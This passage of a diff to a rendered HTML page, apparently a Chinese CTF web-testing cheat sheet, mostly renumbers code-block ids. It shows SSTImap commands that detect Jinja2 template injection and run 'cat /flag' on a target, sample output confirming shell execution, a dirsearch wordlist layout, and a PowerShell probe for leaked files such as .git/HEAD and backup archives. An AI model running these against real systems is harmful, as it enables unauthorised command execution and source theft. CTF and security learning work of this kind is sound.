-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="nv">$SM</span> <span class="p">=</span> <span class="s1">'E:\dsh\tools\SSTImap\sstimap.py'</span>
-</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>
-</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="c"># ① 探测：有没有 SSTI、什么引擎</span>
-</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="n">python</span> <span class="nv">$SM</span> <span class="n">-u</span> <span class="s2">"http://target/qaq?name=*"</span>
-</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>
-</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a><span class="c"># ② 限定引擎，快一点（已知是 Jinja2）</span>
-</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a><span class="n">python</span> <span class="nv">$SM</span> <span class="n">-u</span> <span class="s2">"http://target/qaq?name=*"</span> <span class="n">-e</span> <span class="n">jinja2</span>
-</span><span id="__span-14-8"><a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a>
-</span><span id="__span-14-9"><a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a><span class="c"># ③ 直接执行命令</span>
-</span><span id="__span-14-10"><a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a><span class="n">python</span> <span class="nv">$SM</span> <span class="n">-u</span> <span class="s2">"http://target/qaq?name=*"</span> <span class="n">-e</span> <span class="n">jinja2</span> <span class="n">-S</span> <span class="s2">"cat /flag"</span>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="nv">$SM</span> <span class="p">=</span> <span class="s1">'E:\dsh\tools\SSTImap\sstimap.py'</span>
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>
+</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a><span class="c"># ① 探测：有没有 SSTI、什么引擎</span>
+</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a><span class="n">python</span> <span class="nv">$SM</span> <span class="n">-u</span> <span class="s2">"http://target/qaq?name=*"</span>
+</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a>
+</span><span id="__span-21-6"><a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a><span class="c"># ② 限定引擎，快一点（已知是 Jinja2）</span>
+</span><span id="__span-21-7"><a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a><span class="n">python</span> <span class="nv">$SM</span> <span class="n">-u</span> <span class="s2">"http://target/qaq?name=*"</span> <span class="n">-e</span> <span class="n">jinja2</span>
+</span><span id="__span-21-8"><a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a>
+</span><span id="__span-21-9"><a id="__codelineno-21-9" name="__codelineno-21-9" href="#__codelineno-21-9"></a><span class="c"># ③ 直接执行命令</span>
+</span><span id="__span-21-10"><a id="__codelineno-21-10" name="__codelineno-21-10" href="#__codelineno-21-10"></a><span class="n">python</span> <span class="nv">$SM</span> <span class="n">-u</span> <span class="s2">"http://target/qaq?name=*"</span> <span class="n">-e</span> <span class="n">jinja2</span> <span class="n">-S</span> <span class="s2">"cat /flag"</span>
 </span></code></pre></div>
 <h3 id="_10">常用参数<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h3>
 <table>
@@ -4831,11 +5049,11 @@
 </tbody>
 </table>
 <h3 id="_11">输出长什么样（本机实测）<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>[+] Jinja2 plugin has confirmed injection with tag '*'
-</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>[+] SSTImap identified the following injection point:
-</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>    Engine: Jinja2
-</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>    Injection: *
-</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>Shell command execution: ok
+<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>[+] Jinja2 plugin has confirmed injection with tag '*'
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>[+] SSTImap identified the following injection point:
+</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>    Engine: Jinja2
+</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a>    Injection: *
+</span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a>Shell command execution: ok
 </span></code></pre></div>
 <h3 id="_12">备选<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h3>
 <table>
@@ -4864,20 +5082,20 @@
 </ol>
 <hr />
 <h2 id="9">9. 字典<a class="headerlink" href="#9" title="Permanent link">&para;</a></h2>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>E:\dsh\tools\dict\
-</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>├── common.txt                      ← 小，快
-</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>├── directory-list-2.3-medium.txt   ← 大，慢
-</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>├── quickhits.txt                   ← 备份文件、编辑器残留
-</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>└── raft-medium-*.txt
+<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>E:\dsh\tools\dict\
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>├── common.txt                      ← 小，快
+</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>├── directory-list-2.3-medium.txt   ← 大，慢
+</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a>├── quickhits.txt                   ← 备份文件、编辑器残留
+</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a>└── raft-medium-*.txt
 </span></code></pre></div>
 <p>给 dirsearch 用：<code>-w E:\dsh\tools\dict\directory-list-2.3-medium.txt</code></p>
 <hr />
 <h2 id="10">10. 十秒探路（先跑这个）<a class="headerlink" href="#10" title="Permanent link">&para;</a></h2>
 <p>不知道站里有什么时，先扫这几个常见泄露点，一条命令：</p>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="nv">$base</span> <span class="p">=</span> <span class="s1">'http://target'</span>
-</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="s1">'/robots.txt'</span><span class="p">,</span><span class="s1">'/.git/HEAD'</span><span class="p">,</span><span class="s1">'/www.zip'</span><span class="p">,</span><span class="s1">'/backup.zip'</span><span class="p">,</span><span class="s1">'/.DS_Store'</span><span class="p">,</span>
-</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a><span class="s1">'/phpinfo.php'</span><span class="p">,</span><span class="s1">'/index.php~'</span><span class="p">,</span><span class="s1">'/.index.php.swp'</span><span class="p">,</span><span class="s1">'/flag'</span><span class="p">,</span><span class="s1">'/api/'</span> <span class="p">|</span>
-</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>  <span class="k">ForEach</span><span class="n">-Object</span> <span class="p">{</span> <span class="s1">'{0,-22} {1}'</span> <span class="o">-f</span> <span class="nv">$_</span><span class="p">,</span> <span class="p">(</span><span class="n">curl</span><span class="p">.</span><span class="n">exe</span> <span class="n">-s</span> <span class="n">-o</span> <span class="n">NUL</span> <span class="n">-w</span> <span class="s1">'%{http_code}'</span> <span class="s2">"$base$_"</span><span class="p">)</span> <span class="p">}</span>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="nv">$base</span> <span class="p">=</span> <span class="s1">'http://target'</span>
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a><span class="s1">'/robots.txt'</span><span class="p">,</span><span class="s1">'/.git/HEAD'</span><span class="p">,</span><span class="s1">'/www.zip'</span><span class="p">,</span><span class="s1">'/backup.zip'</span><span class="p">,</span><span class="s1">'/.DS_Store'</span><span class="p">,</span>
+</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a><span class="s1">'/phpinfo.php'</span><span class="p">,</span><span class="s1">'/index.php~'</span><span class="p">,</span><span class="s1">'/.index.php.swp'</span><span class="p">,</span><span class="s1">'/flag'</span><span class="p">,</span><span class="s1">'/api/'</span> <span class="p">|</span>
+</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a>  <span class="k">ForEach</span><span class="n">-Object</span> <span class="p">{</span> <span class="s1">'{0,-22} {1}'</span> <span class="o">-f</span> <span class="nv">$_</span><span class="p">,</span> <span class="p">(</span><span class="n">curl</span><span class="p">.</span><span class="n">exe</span> <span class="n">-s</span> <span class="n">-o</span> <span class="n">NUL</span> <span class="n">-w</span> <span class="s1">'%{http_code}'</span> <span class="s2">"$base$_"</span><span class="p">)</span> <span class="p">}</span>
 </span></code></pre></div>
 <p>看到 <code>200</code> 的再去细看，<code>403</code> 的记下来（有时候换方法就通了）。</p>
 <hr />
